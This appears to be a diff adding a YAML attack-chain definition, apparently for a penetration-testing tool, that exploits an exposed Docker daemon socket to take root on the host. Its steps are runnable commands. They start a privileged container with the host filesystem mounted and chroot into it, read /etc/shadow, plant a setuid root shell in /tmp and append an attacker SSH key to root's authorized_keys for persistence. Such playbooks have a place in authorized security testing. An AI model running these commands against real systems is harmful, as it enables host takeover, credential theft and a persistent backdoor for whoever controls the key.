@@ -1,0 +1,43 @@
+chain_id: docker_socket_exposed
+title: "Docker — exposed daemon socket (TCP 2375 / mounted /var/run/docker.sock) to host root"
+severity: CRITICAL
+tags: [docker, container-escape, privesc, root]
+
+trigger:
+  any_of:
+    - { port: 2375 }
+    - { port: 2376 }
+    - { service_pattern: "(?i)docker" }
+
+description: |
+  Docker daemon listening on a network port without TLS, OR docker.sock
+  bind-mounted into a low-priv container. Either case yields trivial
+  host root: spawn a privileged container with the host root mounted as
+  a volume, chroot in, do whatever.
+
+steps:
+  - id: 1
+    title: "Confirm the daemon answers"
+    command: |
+      docker -H tcp://$VICTIMA:2375 ps
+      # If hitting a mounted socket from inside a container:
+      docker -H unix:///var/run/docker.sock ps
+
+  - id: 2
+    title: "Spin up an alpine container with the host filesystem mounted as /host"
+    command: docker -H tcp://$VICTIMA:2375 run --rm -it --privileged -v /:/host alpine chroot /host
+
+  - id: 3
+    title: "Once chrooted, you are uid=0 on the host"
+    command: |
+      cat /etc/shadow
+      cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
+
+  - id: 4
+    title: "Persistence — drop an SSH key for root and exit cleanly"
+    command: |
+      mkdir -p /root/.ssh
+      echo 'ssh-rsa AAAA... attacker' >> /root/.ssh/authorized_keys
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker
